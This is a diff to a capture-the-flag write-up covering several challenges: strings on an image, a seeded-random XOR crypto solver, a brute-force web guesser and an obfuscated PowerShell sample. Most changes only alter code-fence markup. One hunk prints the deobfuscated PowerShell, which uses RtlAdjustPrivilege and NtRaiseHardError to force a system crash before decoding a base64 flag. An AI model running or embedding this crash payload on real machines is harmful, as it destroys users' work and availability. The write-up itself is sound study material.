@@ -87,7 +87,7 @@ I got the `quartet.jpeg`. Using `strings` to get content and it shows the flag
 
 I got this `server.py`
 
-```python!
+```python
 #!/usr/bin/env python3
 import socket
 import threading
@@ -174,7 +174,7 @@ The problem is server in the way server using seed for random()
 5. XOR key with encrypted flag to get the flag
 
 `solve_crytoclock.py`
-```python!
+```python
 #!/usr/bin/env python3
 import socket
 
@@ -375,9 +375,10 @@ It is another powershell that will execute the base64 text.
 Hmm, a kind of **obfuscation powershell**. In some characteres, it is written in reverse, and somes in the middle has concatenated with `'+'`. **Therefore, I wrote this command in reverse and remove concatenated strings**.
 
 The main part looks like this:
-```!
+---
 using System;using System.Runtime.InteropServices;public static class X{[DllImport(S6Rntdll.dllS6R)]public static extern uint RtlAdjustPrivilege(int P, bool E, bool T, out bool O);[DllImport(S6Rntdll.dllS6R)]public static extern uint NtRaiseHardError(uint E, uint N, uint U, IntPtr P, uint V, out uint R);public static unsafe void Shot(){bool t;uint r;RtlAdjustPrivilege(19, true, false, out t);NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out r);}}bTp;eZic=New-Object System.CodeDom.Compiler.CompilerParameters;eZic.CompilerOptions=bTp/unsafebTp;eZic.ReferencedAssemblies.Add(S6RSystem.dllS6R);eZia=Add-Type -TypeDefinition eZis -Language CSharp -PassThru -CompilerParameters eZic;[X]::Shot();iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(S6RW1N5c3RlbS5FbnZpcm9ubWVudF06OlNldEVudmlyb25tZW50VmFyaWFibGUoImZsYWciLCAiZmxhZ3s3Mzc0NTBhMjhmMzZlMWZkODA4ZTRlZDk5ZjJkODFlMH0iLCAiUHJvY2VzcyIpCg==S6R)))') -cReplAcE([CHAR]98+[CHAR]84+[CHAR]112),[CHAR]39 -REpLACE'S6R',[CHAR]34  -REpLACE  ([CHAR]101+[CHAR]90+[CHAR]105),[CHAR]36))
-```
+
+---
 
 It has a base64 strings, remove `S6R` strings because of `-REpLACE'S6R'`. 
 **Decode base64 strings.**
@@ -403,7 +404,7 @@ Based on How to Play, we need to:
 
 The main idea is that we just send from **1 to 9**, **a to f** with placeholders are alway-wrong chars **z** to find out exactly character in each place.
 
-```python=
+```python
 #!/usr/bin/env python3
 import requests
 import json
